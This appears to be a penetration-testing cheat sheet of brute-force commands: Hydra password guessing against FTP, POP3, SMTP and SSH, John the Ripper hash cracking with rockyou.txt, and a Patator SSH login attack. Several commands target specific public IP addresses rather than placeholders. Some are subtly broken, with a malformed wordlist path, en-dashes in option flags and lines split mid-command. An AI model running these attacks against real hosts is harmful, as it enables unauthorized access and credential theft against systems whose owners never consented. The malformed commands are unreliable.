## Bruteforce

### Hydra FTP
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
192.168.X.XXX ftp -V
```

### Hydra POP3 Brute Force
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
192.168.X.XXX pop3 -V
```

### Hydra SMTP Brute Force
```
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
```

### Hydra SSH
```
hydra -V -f -t 4 -l test -P /root/wordlist ssh://168.90.14.162
hydra -V -f -t 4 -l test -P /usr/share/wfuzz/wordlist/general/spanish.txt ssh://82.223.205.237:3389
```

### JTR password cracking
```
john –wordlist=/usr/share/wordlists/rockyou.txt hashes
```

### JTR forced descrypt cracking with wordlist
```
john –format=descrypt –wordlist
/usr/share/wordlists/rockyou.txt hash.txt
```

### JTR forced descrypt brute force cracking
```
john –format=descrypt hash –show
```

### Patator
```
patator ssh_login host=177.93.38.219 user=test password=FILE0 0=/usr/share/wfuzz/wordlist/general/spanish.txt -x ignore:mesg='Authentification failed'
```
